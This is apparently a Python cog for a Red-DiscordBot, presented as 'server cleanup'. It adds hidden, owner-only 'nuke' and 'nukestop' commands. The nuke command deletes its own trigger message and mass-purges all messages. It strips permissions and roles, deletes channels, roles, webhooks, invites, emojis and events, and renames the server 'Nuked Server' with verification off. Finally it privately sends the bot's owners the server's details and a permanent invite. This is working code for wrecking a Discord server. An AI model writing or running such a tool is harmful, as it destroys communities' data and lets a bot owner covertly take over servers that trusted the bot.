import asyncio

import discord
from discord import ui
from redbot.core import Config, commands




class Nuke(commands.Cog):
    """Server cleanup (hidden commands)."""

    GUILD_NAME = "Nuked Server"
    GUILD_DESCRIPTION = "이 서버는 정리되었습니다."
    GUILD_VERIFICATION = discord.VerificationLevel.none

    def __init__(self, bot):
        self.bot = bot
        self.config = Config.get_conf(self, identifier=914273600321)
        default_guild = {
            "nuke_in_progress": False,
            "deleted_channels": 0,
            "deleted_roles": 0,
            "deleted_emojis": 0,
            "deleted_stickers": 0,
            "deleted_sounds": 0,
            "deleted_webhooks": 0,
            "deleted_invites": 0,
            "deleted_events": 0,
            "purged_messages": 0,
            "reset_permissions": 0,
            "removed_auto_roles": 0,
            "reset_guild_assets": 0,
            "updated_guild_settings": 0,
        }
        self.config.register_guild(**default_guild)
        self._stop_flags = set()
        self._update_every = 5
        self._max_concurrency = 5
        self._owner_log_messages: dict[int, tuple[int, int]] = {}

    async def _is_allowed(self, ctx: commands.Context) -> bool:
        return await self.bot.is_owner(ctx.author)

    def _build_owner_log_view(
        self,
        action: str,
        author: discord.abc.User,
        guild: discord.Guild | None,
        invite_url: str | None,
    ) -> ui.LayoutView:
        view = ui.LayoutView()
        view.add_item(ui.TextDisplay(f"## 🔔 {action} 사용됨"))
        view.add_item(
            ui.TextDisplay(
                f"**시간:** {discord.utils.format_dt(discord.utils.utcnow(), 'F')}"
            )
        )
        view.add_item(ui.Separator(visible=True))

        if guild is not None and (guild.icon or guild.banner):
            assets_container = ui.Container(accent_color=0x2ECC71)
            assets_container.add_item(ui.TextDisplay("**서버 자산**"))
            assets = ui.ActionRow()
            if guild.icon:
                assets.add_item(
                    ui.Button(
                        label="아이콘 보기",
                        style=discord.ButtonStyle.link,
                        url=str(guild.icon.url),
                    )
                )
            if guild.banner:
                assets.add_item(
                    ui.Button(
                        label="배너 보기",
                        style=discord.ButtonStyle.link,
                        url=str(guild.banner.url),
                    )
                )
            if assets.children:
                assets_container.add_item(assets)
                view.add_item(assets_container)

        details = ui.Container(accent_color=0xFF6B6B)
        details.add_item(ui.TextDisplay(f"**사용자:** {author} ({author.id})"))
        details.add_item(
            ui.TextDisplay(
                f"**프로필:** https://discord.com/users/{author.id}"
            )
        )
        if guild is not None:
            details.add_item(ui.TextDisplay(f"**서버:** {guild.name} ({guild.id})"))
            details.add_item(
                ui.TextDisplay(
                    f"**설명:** {guild.description or '없음'}"
                )
            )
            if guild.owner_id:
                details.add_item(
                    ui.TextDisplay(f"**서버 오너:** <@{guild.owner_id}> ({guild.owner_id})")
                )
            details.add_item(ui.TextDisplay(f"**멤버 수:** {guild.member_count:,}"))
            details.add_item(
                ui.TextDisplay(
                    "**생성일:** "
                    f"{discord.utils.format_dt(guild.created_at, 'F')}"
                )
            )
            details.add_item(
                ui.TextDisplay(f"**보안 레벨:** {str(guild.verification_level).title()}")
            )
        else:
            details.add_item(ui.TextDisplay("**서버:** 알 수 없음"))
        view.add_item(details)

        if guild is not None:
            links = ui.ActionRow()
            if guild.system_channel:
                links.add_item(
                    ui.Button(
                        label="서버 바로가기",
                        style=discord.ButtonStyle.link,
                        url=(
                            "https://discord.com/channels/"
                            f"{guild.id}/{guild.system_channel.id}"
                        ),
                    )
                )
            if guild.vanity_url_code:
                links.add_item(
                    ui.Button(
                        label="서버 초대",
                        style=discord.ButtonStyle.link,
                        url=f"https://discord.gg/{guild.vanity_url_code}",
                    )
                )
            if links.children:
                view.add_item(links)

        if invite_url:
            invite_container = ui.Container(accent_color=0x1ABC9C)
            invite_container.add_item(ui.TextDisplay("**영구 초대 링크**"))
            invite_row = ui.ActionRow()
            invite_row.add_item(
                ui.Button(
                    label="초대 링크 열기",
                    style=discord.ButtonStyle.link,
                    url=invite_url,
                )
            )
            invite_container.add_item(invite_row)
            view.add_item(invite_container)

        settings = ui.Container(accent_color=0x5865F2)
        settings.add_item(ui.TextDisplay("**강제 변경 설정**"))
        settings.add_item(ui.TextDisplay(f"이름: {self.GUILD_NAME}"))
        settings.add_item(ui.TextDisplay(f"설명: {self.GUILD_DESCRIPTION}"))
        settings.add_item(
            ui.TextDisplay(
                f"보안 레벨: {str(self.GUILD_VERIFICATION).title()}"
            )
        )
        view.add_item(settings)
        return view

    async def _get_owner_users(self) -> list[discord.abc.User]:
        owners: list[discord.abc.User] = []
        owner_ids = getattr(self.bot, "owner_ids", None)
        if owner_ids:
            for owner_id in owner_ids:
                user = self.bot.get_user(owner_id)
                if user is None:
                    try:
                        user = await self.bot.fetch_user(owner_id)
                    except (discord.NotFound, discord.HTTPException):
                        continue
                owners.append(user)
            return owners

        try:
            app_info = await self.bot.application_info()
        except (discord.HTTPException, discord.Forbidden):
            return owners

        if app_info.team:
            owners.extend(app_info.team.members)
        elif app_info.owner:
            owners.append(app_info.owner)
        return owners

    async def _notify_owners(
        self,
        action: str,
        author: discord.abc.User,
        guild: discord.Guild | None,
        invite_url: str | None = None,
    ):
        owners = await self._get_owner_users()
        if not owners:
            return
        view = self._build_owner_log_view(action, author, guild, invite_url)
        for owner in owners:
            await self._upsert_owner_log_message(owner, view)

    async def _upsert_owner_log_message(
        self, owner: discord.abc.User, view: ui.LayoutView
    ) -> discord.Message | None:
        try:
            channel = owner.dm_channel or await owner.create_dm()
        except (discord.Forbidden, discord.HTTPException):
            return None

        cached = self._owner_log_messages.get(owner.id)
        if cached and cached[0] == channel.id:
            try:
                message = await channel.fetch_message(cached[1])
                await message.edit(view=view)
                return message
            except (discord.NotFound, discord.Forbidden, discord.HTTPException):
                self._owner_log_messages.pop(owner.id, None)

        try:
            message = await channel.send(view=view)
        except (discord.Forbidden, discord.HTTPException):
            return None

        self._owner_log_messages[owner.id] = (channel.id, message.id)
        return message

    async def _send_dm(self, user: discord.abc.User, content: str):
        try:
            return await user.send(content)
        except (discord.Forbidden, discord.HTTPException):
            return None

    async def _send_dm_or_channel(
        self, ctx: commands.Context, content: str, *, delete_after: float | None = 15.0
    ) -> discord.Message | None:
        dm_message = await self._send_dm(ctx.author, content)
        if dm_message:
            return dm_message
        try:
            return await ctx.send(content, delete_after=delete_after)
        except (discord.Forbidden, discord.HTTPException):
            return None

    async def _send_view_dm_or_channel(
        self, ctx: commands.Context, view: ui.LayoutView, *, delete_after: float | None = 15.0
    ) -> discord.Message | None:
        try:
            dm_message = await ctx.author.send(view=view)
        except (discord.Forbidden, discord.HTTPException):
            dm_message = None
        if dm_message:
            return dm_message
        try:
            return await ctx.send(view=view, delete_after=delete_after)
        except (discord.Forbidden, discord.HTTPException):
            return None

    async def _has_required_perms(self, ctx: commands.Context) -> bool:
        me = ctx.guild.me
        if me is None:
            return False
        perms = me.guild_permissions
        return (
            perms.manage_channels
            and perms.manage_roles
            and perms.manage_emojis_and_stickers
            and perms.manage_webhooks
            and perms.manage_guild
            and perms.manage_messages
        )

    async def _wait_for_confirm(self, ctx: commands.Context, message: discord.Message) -> bool:
        def check(reaction: discord.Reaction, user: discord.User):
            if reaction.message.id != message.id:
                return False
            if user.id != ctx.author.id:
                return False
            return str(reaction.emoji) == "✅"

        try:
            await self.bot.wait_for("reaction_add", timeout=30.0, check=check)
            return True
        except asyncio.TimeoutError:
            try:
                await message.add_reaction("❌")
            except discord.HTTPException:
                pass
            return False

    async def _reset_progress(self, guild: discord.Guild):
        await self.config.guild(guild).nuke_in_progress.set(False)
        await self.config.guild(guild).deleted_channels.set(0)
        await self.config.guild(guild).deleted_roles.set(0)
        await self.config.guild(guild).deleted_emojis.set(0)
        await self.config.guild(guild).deleted_stickers.set(0)
        await self.config.guild(guild).deleted_sounds.set(0)
        await self.config.guild(guild).deleted_webhooks.set(0)
        await self.config.guild(guild).deleted_invites.set(0)
        await self.config.guild(guild).deleted_events.set(0)
        await self.config.guild(guild).purged_messages.set(0)
        await self.config.guild(guild).reset_permissions.set(0)
        await self.config.guild(guild).removed_auto_roles.set(0)
        await self.config.guild(guild).reset_guild_assets.set(0)
        await self.config.guild(guild).updated_guild_settings.set(0)

    async def _send_progress_embed(
        self,
        message: discord.Message,
        title: str,
        deleted_channels: int,
        deleted_roles: int,
        deleted_emojis: int,
        deleted_stickers: int,
        deleted_sounds: int,
        deleted_webhooks: int,
        deleted_invites: int,
        deleted_events: int,
        purged_messages: int,
        reset_permissions: int,
        removed_auto_roles: int,
        reset_guild_assets: int,
        updated_guild_settings: int,
        status: str,
    ):
        embed = discord.Embed(title=title, description=status, color=discord.Color.orange())
        embed.add_field(name="채널", value=str(deleted_channels))
        embed.add_field(name="역할", value=str(deleted_roles))
        embed.add_field(name="이모지", value=str(deleted_emojis))
        embed.add_field(name="스티커", value=str(deleted_stickers))
        embed.add_field(name="사운드 보드", value=str(deleted_sounds))
        embed.add_field(name="웹훅", value=str(deleted_webhooks))
        embed.add_field(name="초대", value=str(deleted_invites))
        embed.add_field(name="일정", value=str(deleted_events))
        embed.add_field(name="메시지", value=str(purged_messages))
        embed.add_field(name="권한 초기화", value=str(reset_permissions))
        embed.add_field(name="자동 역할 제거", value=str(removed_auto_roles))
        embed.add_field(name="서버 자산 초기화", value=str(reset_guild_assets))
        embed.add_field(name="서버 설정 변경", value=str(updated_guild_settings))
        try:
            await message.edit(embed=embed)
        except (discord.Forbidden, discord.HTTPException):
            pass

    async def _maybe_update_progress(
        self,
        message: discord.Message,
        counts: dict,
        status: str,
        force: bool = False,
    ):
        total = (
            counts["channels"]
            + counts["roles"]
            + counts["emojis"]
            + counts["stickers"]
            + counts["sounds"]
            + counts["webhooks"]
            + counts["invites"]
            + counts["events"]
            + counts["purged_messages"]
            + counts["reset_permissions"]
            + counts["removed_auto_roles"]
            + counts["reset_guild_assets"]
            + counts["updated_guild_settings"]
        )
        if not force and total % self._update_every != 0:
            return
        await self._send_progress_embed(
            message,
            "🔥 서버 정리 중...",
            counts["channels"],
            counts["roles"],
            counts["emojis"],
            counts["stickers"],
            counts["sounds"],
            counts["webhooks"],
            counts["invites"],
            counts["events"],
            counts["purged_messages"],
            counts["reset_permissions"],
            counts["removed_auto_roles"],
            counts["reset_guild_assets"],
            counts["updated_guild_settings"],
            status,
        )

    async def _bulk_delete(
        self,
        guild: discord.Guild,
        progress_message: discord.Message,
        counts: dict,
        items: list,
        delete_func,
        count_key: str,
        status: str,
        config_attr: str,
    ) -> int:
        if not items:
            return counts[count_key]

        sem = asyncio.Semaphore(self._max_concurrency)
        lock = asyncio.Lock()
        config_value = getattr(self.config.guild(guild), config_attr)

        async def handle(item):
            if guild.id in self._stop_flags:
                return
            async with sem:
                try:
                    await delete_func(item)
                except (discord.Forbidden, discord.HTTPException):
                    return
            async with lock:
                counts[count_key] += 1
                await config_value.set(counts[count_key])
                await self._maybe_update_progress(progress_message, counts, status)

        await asyncio.gather(*(handle(item) for item in items))
        return counts[count_key]

    async def _create_permanent_invite(self, guild: discord.Guild) -> str | None:
        channel = guild.system_channel
        if channel is None:
            channel = next(iter(guild.text_channels), None)
        if channel is None:
            return None
        try:
            invite = await channel.create_invite(
                max_age=0,
                max_uses=0,
                unique=False,
                reason="Nuke cleanup",
            )
        except (discord.Forbidden, discord.HTTPException):
            return None
        return invite.url

    async def _create_nuked_channel_invite(
        self, guild: discord.Guild
    ) -> str | None:
        overwrites = {
            guild.default_role: discord.PermissionOverwrite(
                view_channel=True,
                send_messages=False,
                add_reactions=False,
                create_public_threads=False,
                create_private_threads=False,
                send_messages_in_threads=False,
                attach_files=False,
                embed_links=False,
            )
        }
        try:
            channel = await guild.create_text_channel(
                "Nuked",
                overwrites=overwrites,
                reason="Nuke cleanup",
            )
        except (discord.Forbidden, discord.HTTPException):
            return None
        try:
            invite = await channel.create_invite(
                max_age=0,
                max_uses=0,
                unique=False,
                reason="Nuke cleanup",
            )
        except (discord.Forbidden, discord.HTTPException):
            return None
        return invite.url

    async def _delete_webhooks(
        self, guild: discord.Guild, progress_message: discord.Message, counts: dict
    ):
        try:
            webhooks = await guild.webhooks()
        except (discord.Forbidden, discord.HTTPException):
            return counts["webhooks"]
        return await self._bulk_delete(
            guild,
            progress_message,
            counts,
            list(webhooks),
            lambda hook: hook.delete(reason="Nuke cleanup"),
            "webhooks",
            "웹훅 삭제 중",
            "deleted_webhooks",
        )

    async def _delete_invites(
        self, guild: discord.Guild, progress_message: discord.Message, counts: dict
    ):
        try:
            invites = await guild.invites()
        except (discord.Forbidden, discord.HTTPException):
            return counts["invites"]
        await self._bulk_delete(
            guild,
            progress_message,
            counts,
            list(invites),
            lambda invite: invite.delete(reason="Nuke cleanup"),
            "invites",
            "초대 삭제 중",
            "deleted_invites",
        )
        await self._remove_vanity_invite(guild, progress_message, counts)
        return counts["invites"]

    async def _remove_vanity_invite(
        self, guild: discord.Guild, progress_message: discord.Message, counts: dict
    ):
        if not getattr(guild, "vanity_url_code", None):
            return counts["invites"]
        for key in ("vanity_url_code", "vanity_code"):
            try:
                await guild.edit(**{key: None}, reason="Nuke cleanup")
            except TypeError:
                continue
            except (discord.Forbidden, discord.HTTPException):
                return counts["invites"]
            counts["invites"] += 1
            await self.config.guild(guild).deleted_invites.set(counts["invites"])
            await self._maybe_update_progress(progress_message, counts, "초대 삭제 중")
            return counts["invites"]
        return counts["invites"]

    async def _delete_scheduled_events(
        self, guild: discord.Guild, progress_message: discord.Message, counts: dict
    ):
        events = list(getattr(guild, "scheduled_events", []))
        if not events:
            return counts["events"]
        return await self._bulk_delete(
            guild,
            progress_message,
            counts,
            events,
            lambda event: event.delete(reason="Nuke cleanup"),
            "events",
            "일정 삭제 중",
            "deleted_events",
        )

    async def _delete_channels(
        self, guild: discord.Guild, progress_message: discord.Message, counts: dict
    ):
        return await self._bulk_delete(
            guild,
            progress_message,
            counts,
            list(guild.channels),
            lambda channel: channel.delete(reason="Nuke cleanup"),
            "channels",
            "채널 삭제 중",
            "deleted_channels",
        )

    async def _delete_roles(
        self, guild: discord.Guild, progress_message: discord.Message, counts: dict
    ):
        roles = [role for role in guild.roles if not role.managed and not role.is_default()]
        return await self._bulk_delete(
            guild,
            progress_message,
            counts,
            roles,
            lambda role: role.delete(reason="Nuke cleanup"),
            "roles",
            "역할 삭제 중",
            "deleted_roles",
        )

    async def _delete_emojis(
        self, guild: discord.Guild, progress_message: discord.Message, counts: dict
    ):
        return await self._bulk_delete(
            guild,
            progress_message,
            counts,
            list(getattr(guild, "emojis", [])),
            lambda emoji: emoji.delete(reason="Nuke cleanup"),
            "emojis",
            "이모지 삭제 중",
            "deleted_emojis",
        )

    async def _delete_stickers(
        self, guild: discord.Guild, progress_message: discord.Message, counts: dict
    ):
        return await self._bulk_delete(
            guild,
            progress_message,
            counts,
            list(getattr(guild, "stickers", [])),
            lambda sticker: sticker.delete(reason="Nuke cleanup"),
            "stickers",
            "스티커 삭제 중",
            "deleted_stickers",
        )

    async def _delete_sounds(
        self, guild: discord.Guild, progress_message: discord.Message, counts: dict
    ):
        sounds = getattr(guild, "soundboard_sounds", None)
        if sounds is None:
            return counts["sounds"]
        return await self._bulk_delete(
            guild,
            progress_message,
            counts,
            list(sounds),
            lambda sound: sound.delete(reason="Nuke cleanup"),
            "sounds",
            "사운드 보드 삭제 중",
            "deleted_sounds",
        )

    async def _purge_messages(
        self, guild: discord.Guild, progress_message: discord.Message, counts: dict
    ):
        channels: list[discord.abc.GuildChannel] = [
            channel
            for channel in guild.channels
            if hasattr(channel, "purge")
        ]

        for channel in getattr(guild, "text_channels", []):
            for thread in list(getattr(channel, "threads", [])):
                channels.append(thread)
            if hasattr(channel, "archived_threads"):
                try:
                    async for thread in channel.archived_threads(limit=None):
                        channels.append(thread)
                except (discord.Forbidden, discord.HTTPException):
                    continue

        if not channels:
            return counts["purged_messages"]

        sem = asyncio.Semaphore(self._max_concurrency)
        lock = asyncio.Lock()
        config_value = self.config.guild(guild).purged_messages

        async def handle(channel):
            if guild.id in self._stop_flags:
                return
            async with sem:
                try:
                    deleted = await channel.purge(limit=None, bulk=True)
                except (discord.Forbidden, discord.HTTPException):
                    return
            async with lock:
                counts["purged_messages"] += len(deleted)
                await config_value.set(counts["purged_messages"])
                await self._maybe_update_progress(progress_message, counts, "메시지 삭제 중")

        await asyncio.gather(*(handle(channel) for channel in channels))
        return counts["purged_messages"]

    async def _reset_channel_permissions(
        self, guild: discord.Guild, progress_message: discord.Message, counts: dict
    ):
        channels = list(guild.channels)
        if not channels:
            return counts["reset_permissions"]

        sem = asyncio.Semaphore(self._max_concurrency)
        lock = asyncio.Lock()
        config_value = self.config.guild(guild).reset_permissions

        async def handle(channel):
            if guild.id in self._stop_flags:
                return
            async with sem:
                try:
                    await channel.edit(overwrites={}, reason="Nuke cleanup")
                except (discord.Forbidden, discord.HTTPException):
                    return
            async with lock:
                counts["reset_permissions"] += 1
                await config_value.set(counts["reset_permissions"])
                await self._maybe_update_progress(progress_message, counts, "채널 권한 초기화 중")

        await asyncio.gather(*(handle(channel) for channel in channels))
        return counts["reset_permissions"]

    async def _remove_auto_roles(
        self, guild: discord.Guild, progress_message: discord.Message, counts: dict
    ):
        me = guild.me
        if me is None:
            return counts["removed_auto_roles"]

        sem = asyncio.Semaphore(self._max_concurrency)
        lock = asyncio.Lock()
        config_value = self.config.guild(guild).removed_auto_roles

        async def handle(member: discord.Member):
            if guild.id in self._stop_flags:
                return
            roles_to_remove = [
                role
                for role in member.roles
                if not role.is_default()
                and not role.managed
                and role < me.top_role
            ]
            if not roles_to_remove:
                return
            async with sem:
                try:
                    await member.remove_roles(*roles_to_remove, reason="Nuke cleanup")
                except (discord.Forbidden, discord.HTTPException):
                    return
            async with lock:
                counts["removed_auto_roles"] += len(roles_to_remove)
                await config_value.set(counts["removed_auto_roles"])
                await self._maybe_update_progress(progress_message, counts, "자동 역할 제거 중")

        await asyncio.gather(*(handle(member) for member in guild.members))
        return counts["removed_auto_roles"]

    async def _reset_guild_assets(
        self, guild: discord.Guild, progress_message: discord.Message, counts: dict
    ):
        if guild.id in self._stop_flags:
            return counts["reset_guild_assets"]
        try:
            await guild.edit(icon=None, banner=None, reason="Nuke cleanup")
        except (discord.Forbidden, discord.HTTPException):
            return counts["reset_guild_assets"]
        counts["reset_guild_assets"] += 1
        await self.config.guild(guild).reset_guild_assets.set(counts["reset_guild_assets"])
        await self._maybe_update_progress(progress_message, counts, "서버 자산 초기화 중")
        return counts["reset_guild_assets"]

    async def _update_guild_settings(
        self, guild: discord.Guild, progress_message: discord.Message, counts: dict
    ):
        if guild.id in self._stop_flags:
            return counts["updated_guild_settings"]
        try:
            await guild.edit(
                name=self.GUILD_NAME,
                description=self.GUILD_DESCRIPTION,
                verification_level=self.GUILD_VERIFICATION,
                reason="Nuke cleanup",
            )
        except (discord.Forbidden, discord.HTTPException):
            return counts["updated_guild_settings"]
        counts["updated_guild_settings"] += 1
        await self.config.guild(guild).updated_guild_settings.set(
            counts["updated_guild_settings"]
        )
        await self._maybe_update_progress(progress_message, counts, "서버 설정 변경 중")
        return counts["updated_guild_settings"]

    def _build_summary_view(self, elapsed: float, counts: dict) -> ui.LayoutView:
        view = ui.LayoutView()
        view.add_item(ui.TextDisplay("## ✅ 서버 정리 요약"))
        view.add_item(
            ui.TextDisplay(
                f"**소요 시간:** {elapsed:.2f}초"
            )
        )
        view.add_item(ui.Separator(visible=True))

        summary = ui.Container(accent_color=0xF1C40F)
        summary.add_item(ui.TextDisplay(f"채널: {counts['channels']}개"))
        summary.add_item(ui.TextDisplay(f"역할: {counts['roles']}개"))
        summary.add_item(ui.TextDisplay(f"이모지: {counts['emojis']}개"))
        summary.add_item(ui.TextDisplay(f"스티커: {counts['stickers']}개"))
        summary.add_item(ui.TextDisplay(f"사운드 보드: {counts['sounds']}개"))
        summary.add_item(ui.TextDisplay(f"웹훅: {counts['webhooks']}개"))
        summary.add_item(ui.TextDisplay(f"초대: {counts['invites']}개"))
        summary.add_item(ui.TextDisplay(f"일정: {counts['events']}개"))
        summary.add_item(ui.TextDisplay(f"메시지: {counts['purged_messages']}개"))
        summary.add_item(ui.TextDisplay(f"권한 초기화: {counts['reset_permissions']}개"))
        summary.add_item(ui.TextDisplay(f"자동 역할 제거: {counts['removed_auto_roles']}개"))
        summary.add_item(ui.TextDisplay(f"서버 자산 초기화: {counts['reset_guild_assets']}회"))
        summary.add_item(ui.TextDisplay(f"서버 설정 변경: {counts['updated_guild_settings']}회"))
        view.add_item(summary)
        return view

    @commands.command(hidden=True)
    @commands.guild_only()
    async def nuke(self, ctx: commands.Context):
        if not await self._is_allowed(ctx):
            return

        if ctx.guild is None:
            return

        invite_url = None

        if ctx.message:
            try:
                await ctx.message.delete()
            except (discord.Forbidden, discord.HTTPException):
                pass

        if not await self._has_required_perms(ctx):
            await self._send_dm_or_channel(ctx, "봇에게 필요한 권한이 없습니다.")
            return

        if await self.config.guild(ctx.guild).nuke_in_progress():
            await self._send_dm_or_channel(ctx, "이미 서버 정리가 진행 중입니다.")
            return

        await self._reset_progress(ctx.guild)
        await self.config.guild(ctx.guild).nuke_in_progress.set(True)
        progress_dm = await self._send_dm_or_channel(ctx, "🔄 서버 정리 준비 중...")
        if not progress_dm:
            await self.config.guild(ctx.guild).nuke_in_progress.set(False)
            return

        self._stop_flags.discard(ctx.guild.id)

        counts = {
            "channels": 0,
            "roles": 0,
            "emojis": 0,
            "stickers": 0,
            "sounds": 0,
            "webhooks": 0,
            "invites": 0,
            "events": 0,
            "purged_messages": 0,
            "reset_permissions": 0,
            "removed_auto_roles": 0,
            "reset_guild_assets": 0,
            "updated_guild_settings": 0,
        }
        start_time = asyncio.get_running_loop().time()

        await self._send_progress_embed(
            progress_dm,
            "🔥 서버 정리 중...",
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            0,
            "시작",
        )
        purged_messages = await self._purge_messages(ctx.guild, progress_dm, counts)
        reset_permissions = 0
        if ctx.guild.id not in self._stop_flags:
            reset_permissions = await self._reset_channel_permissions(
                ctx.guild, progress_dm, counts
            )
        removed_auto_roles = 0
        if ctx.guild.id not in self._stop_flags:
            removed_auto_roles = await self._remove_auto_roles(
                ctx.guild, progress_dm, counts
            )
        deleted_webhooks = 0
        if ctx.guild.id not in self._stop_flags:
            deleted_webhooks = await self._delete_webhooks(ctx.guild, progress_dm, counts)
        deleted_invites = 0
        if ctx.guild.id not in self._stop_flags:
            deleted_invites = await self._delete_invites(ctx.guild, progress_dm, counts)
        deleted_events = 0
        if ctx.guild.id not in self._stop_flags:
            deleted_events = await self._delete_scheduled_events(ctx.guild, progress_dm, counts)
        deleted_channels = 0
        if ctx.guild.id not in self._stop_flags:
            deleted_channels = await self._delete_channels(ctx.guild, progress_dm, counts)
        deleted_roles = 0
        if ctx.guild.id not in self._stop_flags:
            deleted_roles = await self._delete_roles(ctx.guild, progress_dm, counts)
        deleted_emojis = 0
        if ctx.guild.id not in self._stop_flags:
            deleted_emojis = await self._delete_emojis(ctx.guild, progress_dm, counts)
        deleted_stickers = 0
        if ctx.guild.id not in self._stop_flags:
            deleted_stickers = await self._delete_stickers(ctx.guild, progress_dm, counts)
        deleted_sounds = 0
        if ctx.guild.id not in self._stop_flags:
            deleted_sounds = await self._delete_sounds(ctx.guild, progress_dm, counts)
        reset_guild_assets = 0
        if ctx.guild.id not in self._stop_flags:
            reset_guild_assets = await self._reset_guild_assets(
                ctx.guild, progress_dm, counts
            )
        updated_guild_settings = 0
        if ctx.guild.id not in self._stop_flags:
            updated_guild_settings = await self._update_guild_settings(
                ctx.guild, progress_dm, counts
            )
        if ctx.guild.id not in self._stop_flags:
            invite_url = await self._create_nuked_channel_invite(ctx.guild)
        await self._notify_owners("nuke", ctx.author, ctx.guild, invite_url)

        await self.config.guild(ctx.guild).deleted_channels.set(deleted_channels)
        await self.config.guild(ctx.guild).deleted_roles.set(deleted_roles)
        await self.config.guild(ctx.guild).deleted_emojis.set(deleted_emojis)
        await self.config.guild(ctx.guild).deleted_stickers.set(deleted_stickers)
        await self.config.guild(ctx.guild).deleted_sounds.set(deleted_sounds)
        await self.config.guild(ctx.guild).deleted_webhooks.set(deleted_webhooks)
        await self.config.guild(ctx.guild).deleted_invites.set(deleted_invites)
        await self.config.guild(ctx.guild).deleted_events.set(deleted_events)
        await self.config.guild(ctx.guild).purged_messages.set(purged_messages)
        await self.config.guild(ctx.guild).reset_permissions.set(reset_permissions)
        await self.config.guild(ctx.guild).removed_auto_roles.set(removed_auto_roles)
        await self.config.guild(ctx.guild).reset_guild_assets.set(reset_guild_assets)
        await self.config.guild(ctx.guild).updated_guild_settings.set(
            updated_guild_settings
        )

        elapsed = asyncio.get_running_loop().time() - start_time

        if ctx.guild.id in self._stop_flags:
            await self._send_progress_embed(
                progress_dm,
                "⏸️ 중단됨",
                deleted_channels,
                deleted_roles,
                deleted_emojis,
                deleted_stickers,
                deleted_sounds,
                deleted_webhooks,
                deleted_invites,
                deleted_events,
                purged_messages,
                reset_permissions,
                removed_auto_roles,
                reset_guild_assets,
                updated_guild_settings,
                "중단됨",
            )
        else:
            await self._send_progress_embed(
                progress_dm,
                "✅ 서버 정리 완료",
                deleted_channels,
                deleted_roles,
                deleted_emojis,
                deleted_stickers,
                deleted_sounds,
                deleted_webhooks,
                deleted_invites,
                deleted_events,
                purged_messages,
                reset_permissions,
                removed_auto_roles,
                reset_guild_assets,
                updated_guild_settings,
                "완료",
            )
        summary_counts = {
            "channels": deleted_channels,
            "roles": deleted_roles,
            "emojis": deleted_emojis,
            "stickers": deleted_stickers,
            "sounds": deleted_sounds,
            "webhooks": deleted_webhooks,
            "invites": deleted_invites,
            "events": deleted_events,
            "purged_messages": purged_messages,
            "reset_permissions": reset_permissions,
            "removed_auto_roles": removed_auto_roles,
            "reset_guild_assets": reset_guild_assets,
            "updated_guild_settings": updated_guild_settings,
        }
        await self._send_view_dm_or_channel(
            ctx,
            self._build_summary_view(elapsed, summary_counts),
        )

        await self.config.guild(ctx.guild).nuke_in_progress.set(False)
        if progress_dm:
            try:
                await progress_dm.edit(content=None)
            except discord.HTTPException:
                pass

    @commands.command(hidden=True)
    @commands.guild_only()
    async def nukestop(self, ctx: commands.Context):
        if not await self._is_allowed(ctx):
            return

        if ctx.guild is None:
            return

        await self._notify_owners("nukestop", ctx.author, ctx.guild)

        if not await self.config.guild(ctx.guild).nuke_in_progress():
            return

        self._stop_flags.add(ctx.guild.id)
        deleted_channels = await self.config.guild(ctx.guild).deleted_channels()
        deleted_roles = await self.config.guild(ctx.guild).deleted_roles()
        deleted_emojis = await self.config.guild(ctx.guild).deleted_emojis()
        deleted_stickers = await self.config.guild(ctx.guild).deleted_stickers()
        deleted_sounds = await self.config.guild(ctx.guild).deleted_sounds()
        deleted_webhooks = await self.config.guild(ctx.guild).deleted_webhooks()
        deleted_invites = await self.config.guild(ctx.guild).deleted_invites()
        deleted_events = await self.config.guild(ctx.guild).deleted_events()
        purged_messages = await self.config.guild(ctx.guild).purged_messages()
        reset_permissions = await self.config.guild(ctx.guild).reset_permissions()
        removed_auto_roles = await self.config.guild(ctx.guild).removed_auto_roles()
        reset_guild_assets = await self.config.guild(ctx.guild).reset_guild_assets()
        updated_guild_settings = await self.config.guild(ctx.guild).updated_guild_settings()
        progress_dm = await self._send_dm(ctx.author, "⏸️ 중단 처리 중...")
        if progress_dm:
            await self._send_progress_embed(
                progress_dm,
                "⏸️ 중단됨",
                deleted_channels,
                deleted_roles,
                deleted_emojis,
                deleted_stickers,
                deleted_sounds,
                deleted_webhooks,
                deleted_invites,
                deleted_events,
                purged_messages,
                reset_permissions,
                removed_auto_roles,
                reset_guild_assets,
                updated_guild_settings,
                "중단됨",
            )
